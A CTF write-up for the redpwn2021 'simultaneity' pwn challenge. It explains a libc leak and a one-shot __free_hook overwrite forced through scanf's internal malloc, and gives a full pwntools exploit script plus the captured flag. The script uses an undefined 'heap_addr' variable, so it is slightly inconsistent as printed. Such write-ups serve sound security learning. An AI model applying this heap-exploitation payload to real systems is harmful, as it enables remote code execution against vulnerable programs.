---
title: simultaneity
date: 2021-07-11
categories: [pwn]
tags: [redpwn2021]
toc: false
---

#### Notes:
- Upon initial inspection we see that all mitigations are enabled besides stack canary (Full RELRO, PIE, NX)
- Looking at the code we can see that there are multiple scanf() calls as well as a leak from calling malloc() with a user specified size
- Now this is looking like a write what where primitive, with full relro, meaning we can't overwrite GOT entries and have to look deeper
- I was overthinking this challenge heavily and went off on several tangents, digging into FSOP and rtld based exploits (which are interesting)

#### Behavior:
- The program asks us "how big?" (long integer) which prompts our size input and allows us to leak a pointer to heap memory
- The program asks us "how far?" prompting another input (long integer)
- Finally, the program asks us "what?" prompting us to write to an address + distance (unsigned int with length modifier)

#### Caveats: 
- Since this is a write what where challenge, we usually can just overwrite a function that will be called later and we win. But in this case, we only have one 8byte write and _exit is being called instead of exit(), which eliminates the chances of using rtld based exploits. 
    - https://koharinn.tistory.com/218
- So we know that we can only write one time and something has to happen "simultaneously" (name of the challenge gives a subtle hint)

#### Plan:
- We need a libc leak of some kind, but we only get a pointer to a heap address. So by providing a large input such as 900000, we get a leak to a mmap'd location, which is close to libc
- Using the above leak, we can calculate the libc base and our target
- Looking at how the last scanf() uses %zu as a format specifier, we can abuse the scanf() internals by causing it to create heap space on our payload as well as overwrite our target function
- Using the distance formula my friend created (@biazo), we targeted the __free_hook function and forced scanf() to call malloc by providing an input that contains 0x1000 '0' + one_gadget  
- This works because sending 000000000000000...0000+one_gadget will basically create heap space without messing up our payload (it will treat it like 000009 = 9). Trying 111111111.11111+one_gadget will overwrite __free_hook with 0xffffffffffffff 

#### main():

![Snipper of main()](/assets/img/redpwn2021/main.png)

#### PoC:

```python3
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./simultaneity --host mc.ax --port 31547
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./simultaneity')
context.terminal = ['tmux','splitw','-v']
libc = ELF('./libc.so.6')
# libc = exe.libc

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'mc.ax'
port = int(args.PORT or 31547)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
set verbose on
tbreak main
b __isoc99_scanf
b _exit
continue
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

def dist(heap_addr, target_addr):
    target_index = (0xFFFF_FFFF_FFFF_FFFF - heap_addr) + target_addr + 8
    target_index = (target_index >> 3)
    return target_index

def run(m_len):

    io.sendlineafter(b'how big?\n', str(m_len))

    io.recvuntil('you are here: ')

    leak_addr = int(io.recvline()[:-1],16)
    print(f'Leaked addr is {hex(leak_addr)}')
    libc_base = leak_addr + 0xdbff0
    print('Libc base: ', hex(libc_base))
    libc.address = libc_base

    # Change target address for write where
    # __free_hook
    target_addr = libc.address + 0x1bd8e8
    print('target addr: ', hex(target_addr))
    m_index = dist(heap_addr, target_addr)
    print('how far?: ', m_index)
    io.sendlineafter(b'how far?\n', str(m_index))

    # Change target_data for write what 
    """
    one_gadgets:
    0x4484f
    0x448a3
    0xe5456
    """
    libc_target_offset = 0xe5456
    target_data = libc.address + libc_target_offset

    one_gad = target_data
    print(f'Writing {hex(target_data)}')
    # Create large input with many zeroes to force scanf to call malloc/free without changing our one_gad payload
    io.sendlineafter(b'what?\n', str(0x1000 * '0')+str(one_gad))
io = start(env={"LD_PRELOAD":"./libc.so.6 "})

run(900000)

io.interactive()
#flag{sc4nf_i3_4_h34p_ch4l13ng3_TKRs8b1DRlN1hoLJ}
```